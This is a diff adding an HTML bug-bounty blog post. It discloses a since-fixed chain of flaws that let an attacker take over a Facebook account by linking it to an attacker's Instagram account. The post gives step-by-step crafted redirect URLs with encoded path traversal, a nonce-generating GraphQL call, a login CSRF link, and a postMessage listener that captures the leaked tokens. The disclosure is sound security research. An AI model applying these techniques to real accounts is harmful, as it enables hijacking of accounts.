@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Two-click Facebook account takeover via FXAuth token and blob theft | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Two-click Facebook account takeover via FXAuth token and blob theft" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms." />
+<meta property="og:description" content="Introduction Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms." />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-15T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Two-click Facebook account takeover via FXAuth token and blob theft" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-15T00:00:00+02:00","datePublished":"2026-01-15T00:00:00+02:00","description":"Introduction Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.","headline":"Two-click Facebook account takeover via FXAuth token and blob theft","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"},"url":"http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Two-click Facebook account takeover via FXAuth token and blob theft</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2026-01-15T00:00:00+02:00" itemprop="datePublished">Jan 15, 2026
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="introduction">Introduction</h2>
+<hr />
+<p><br />
+Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.</p>
+
+<p>This integration relies on native SSO flows, FXAuth tokens, and redirect-based handoffs between Facebook and Instagram <code class="language-plaintext highlighter-rouge">accountscenter</code> domains. When these components are not strictly isolated, a single leaked token can be replayed across platforms and escalate into full account compromise.</p>
+
+<p>This report describes a complete attack chain that allows an attacker to link a victim’s Facebook account to the attacker’s Instagram account and gain persistent access.</p>
+
+<h2 id="high-level-impact">High-Level Impact</h2>
+<hr />
+<p><br />
+After successful exploitation, the attacker can:</p>
+
+<ul>
+  <li>Link the victim’s Facebook account to the attacker’s Instagram account</li>
+  <li>Control Facebook account settings through Accounts Center</li>
+  <li>Potentially authenticate into Facebook using Instagram login (mobile)</li>
+  <li>Maintain long-term access without Facebook credentials or 2FA</li>
+</ul>
+
+<h2 id="descrption">Descrption</h2>
+<hr />
+<h3 id="accounts-center-native-sso-endpoint">Accounts Center Native SSO Endpoint</h3>
+
+<p>The vulnerability originates from the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/login/native_sso/</code>. This endpoint is used for cross-app authentication and accepts several parameters, including:</p>
+
+<ul>
+  <li>app_id</li>
+  <li>token (FXAuth token to be signed)</li>
+  <li>extra_data (redirect path)</li>
+</ul>
+
+<p>The <code class="language-plaintext highlighter-rouge">extra_data</code> parameter is validated based on the calling application.</p>
+
+<p>For the Instagram application (app_id = <code class="language-plaintext highlighter-rouge">1217981644879628</code>), Facebook historically allowed any redirect path starting with <code class="language-plaintext highlighter-rouge">/accounts_center/</code>. This behavior existed before <code class="language-plaintext highlighter-rouge">accountscenter.instagram.com</code> was introduced.</p>
+
+<p>By abusing double url encoded characters and path traversal, it is possible to escape the intended <code class="language-plaintext highlighter-rouge">/accounts_center/</code> prefix and redirect to any other endpoints while still passing validation.</p>
+
+<p>The following crafted URL demonstrates the bypass:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
+<span class="err">&amp;</span>flow=fbcal
+<span class="err">&amp;</span>app_id=1217981644879628
+<span class="err">&amp;</span>token=FXAUTH_TOKEN
+<span class="err">&amp;</span>custom_content_config=accounts_center
+<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\any_endpoint
+</code></pre></div></div>
+<p>After user confirmation, the flow redirects to https://www.instagram.com/any_endpoint</p>
+
+<h3 id="redirect-endpoint--billing_interfacesexternal_result">Redirect endpoint : /billing_interfaces/external_result</h3>
+
+<p>The native SSO flow now could redirect to any endpoint in <code class="language-plaintext highlighter-rouge">www.instagram.com</code>, i managed to find this particular endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/billing_interfaces/external_result/?
+<span class="err">&amp;</span>token=TOKEN
+<span class="err">&amp;</span>blob=BLOB
+</code></pre></div></div>
+
+<p>This endpoint would try to communicate with its <code class="language-plaintext highlighter-rouge">opener</code> and <code class="language-plaintext highlighter-rouge">parent</code> windows using <code class="language-plaintext highlighter-rouge">postMessage</code> with target origin set to <code class="language-plaintext highlighter-rouge">*</code>. Normally, only limited data is sent. However, when a valid <code class="language-plaintext highlighter-rouge">nonce</code> parameter is added to the endpoint, it would send the <strong>entire URL</strong>, leaking sensitive parameters including:</p>
+
+<ul>
+  <li>token</li>
+  <li>blob</li>
+</ul>
+
+<p>This behavior enables token exfiltration. The <code class="language-plaintext highlighter-rouge">nonce</code> however cannot be guessed and must be generated legitimately for a specific Instagram user. This means that we will need to generate a <code class="language-plaintext highlighter-rouge">nonce</code> for the attacker Instagram account, then force login the instagram account inside the victim’s browser.</p>
+
+<h2 id="attack-flow-summary">Attack Flow Summary</h2>
+
+<hr />
+<h3 id="preparation">Preparation</h3>
+
+<h4 id="i---generating-a-valid-nonce-for-the-endpoint">I - Generating a valid nonce for the endpoint</h4>
+<hr />
+<p><br />
+Using an attacker-controlled Instagram account:</p>
+
+<p>1) Visit <code class="language-plaintext highlighter-rouge">https://www.instagram.com/ad_tools/</code></p>
+
+<p>2) Click “Add funds” or “Payment Settings”</p>
+
+<p>3) Capture a request containing an <code class="language-plaintext highlighter-rouge">access_token</code>, to either:</p>
+<ul>
+  <li>facebook.com/auth/token</li>
+  <li>graph.facebook.com</li>
+</ul>
+
+<p>4) Use the access token to call the following GraphQL mutation:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/graphql/?
+<span class="err">&amp;</span>locale=en_US
+<span class="err">&amp;</span>access_token=ACCESS_TOKEN
+<span class="err">&amp;</span>variables={
+  "input": {
+    "country": "US",
+    "establish_type": "INIT",
+    "logging_data": {
+      "logging_counter": 41,
+      "logging_id": "3790958217"
+    },
+    "payment_account_id": "PAYMENT_ACCOUNT_ID",
+    "upl_logging_data": {},
+    "actor_id": "1",
+    "client_mutation_id": "16"
+  }
+}
+<span class="err">&amp;</span>server_timestamps=true
+<span class="err">&amp;</span>doc_id=8354858754606667
+<span class="err">&amp;</span>method=post
+</code></pre></div></div>
+
+<p>Where <code class="language-plaintext highlighter-rouge">PAYMENT_ACCOUNT_ID</code> is obtained from the url:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_hub/payment_settings/?asset_id=PAYMENT_ACCOUNT_ID</code></p>
+
+<p>The response contains a valid nonce value, for example: <code class="language-plaintext highlighter-rouge">hwFlRFhb3krN0rprx16bYLQ2FQ9bpJei</code></p>
+
+<h4 id="ii---instagram-login-csrf">II - Instagram Login CSRF</h4>
+<hr />
+<p><br />
+This can be achieved using Instagram’s email-based login flow. When a user initiates a password reset on Instagram, they receive an email titled:</p>
+
+<p><code class="language-plaintext highlighter-rouge">We’ve made it easy to get back on Instagram</code></p>
+
+<p>The email contains a “Login as USERNAME” link pointing to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/_n/web_emaillogin?
+<span class="err">&amp;</span>uid=ENCODED_UID
+<span class="err">&amp;</span>token=LOGIN_NONCE
+<span class="err">&amp;</span>auto_send=0
+</code></pre></div></div>
+<p>Visiting this URL automatically authenticates you in the browser and sets Instagram session cookies without requiring any further interaction. This endpoint acts as a login CSRF primitive.</p>
+
+<h4 id="iii---generating-an-fxauth-token-to-be-signed">III - Generating an FXAuth Token to be signed</h4>
+<hr />
+<p><br />
+The FXAuth token that we will use in this attack needs to be initially generated by the attacker, sent to the victim in the exploit, then use the received <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code> , which will be linked to the initial token, to finalize the linking process with the attacker account:</p>
+
+<p>As the attacker:</p>
+
+<p>1) Visit <code class="language-plaintext highlighter-rouge">https://accountscenter.instagram.com/profiles/</code></p>
+
+<p>2) Click “Add account”</p>
+
+<p>3) You get redirected to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.facebook.com/login/native_sso/?
+   <span class="err">&amp;</span>flow=fbcalcomettest
+   <span class="err">&amp;</span>app_id=1217981644879628
+   <span class="err">&amp;</span>token=FXAUTH_TOKEN
+   <span class="err">&amp;</span>extra_data=%2Fadd%2F%3Fbackground_page%3D%252Fprofiles%252F<span class="err">&amp;</span>custom_content_config=accounts_center
+</code></pre></div></div>
+<p>4) Extract the <code class="language-plaintext highlighter-rouge">token</code> parameter value and close the page without further interaction.
+<br /></p>
+
+<hr />
+<h3 id="attack">Attack</h3>
+<p>0) Victim visits attackers website</p>
+
+<p>1) The attacker force the victim to login the his Instagram account by loading the Instagram login CSRF URL:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.instagram.com/_n/web_emaillogin?
+   <span class="err">&amp;</span>uid=ENC_UID
+   <span class="err">&amp;</span>token=LOGIN_NONCE
+   <span class="err">&amp;</span>auto_send=0
+</code></pre></div></div>
+
+<p>2) After detecting the login, the attacker’s script opens a new window with the crafted Native SSO URL:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
+<span class="err">&amp;</span>flow=fbcal
+<span class="err">&amp;</span>app_id=1217981644879628
+<span class="err">&amp;</span>token=FXAUTH_TOKEN
+<span class="err">&amp;</span>custom_content_config=accounts_center
+<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\billing_interfaces\external_result?nonce=ATTACKER_NONCE
+</code></pre></div></div>
+
+<p>3) Victim confirms usage of Instagram app</p>
+
+<p>4) The endpoint redirects back to <code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_interfaces/external_result/?blob=VICTIM_BLOB&amp;token=VICTIM_TOKEN&amp;nonce=ATTACKER_NONCE</code>.</p>
+
+<p>5) The endpoint sends a message via <code class="language-plaintext highlighter-rouge">postMessage</code> to the <code class="language-plaintext highlighter-rouge">opener</code> window containing the full redirect URL</p>
+
+<p>6) The attacker captures the message and extracts blob and token using this example listener</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nf">log_data</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">direct_debit_redirect_url</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>7) Using the stolen victim’s <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>, the attacker later navigates to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.instagram.com/add/?
+<span class="err">&amp;</span>background_page=%2Fprofiles%2F
+<span class="err">&amp;</span>blob=BLOB
+<span class="err">&amp;</span>token=TOKEN
+<span class="err">&amp;</span>auth_flow=linking
+
+</code></pre></div></div>
+<p>The victim’s Facebook account gets linked to the attacker’s Instagram account. At this point, the attacker gains control through Accounts Center and can manage settings or authenticate via Instagram.</p>
+
+<h2 id="impact">Impact</h2>
+<hr />
+<p><br />
+This vulnerability enables cross-platform account takeover by chaining:</p>
+
+<ul>
+  <li>FXAuth token reuse</li>
+  <li>Weak redirect validation in native SSO</li>
+  <li>Token leakage via postMessage</li>
+  <li>Email-based Instagram login CSRF</li>
+</ul>
+
+<p>The result is persistent Facebook account compromise without passwords or 2FA.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 16, 2024 — Bug reported</p>
+
+<p>Oct 30, 2024 — Bug Acknowledged by Facebook</p>
+
+<p>Nov 5, 2024 — Bug Fixed by Facebook</p>
+
+<p>Nov 27, 2024 — <strong>$30,000</strong> bounty awarded by Meta</p>
+
+  </div><a class="u-url" href="/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li><li><a class="u-email" href="mailto:ysamm@proton.me">ysamm@proton.me</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
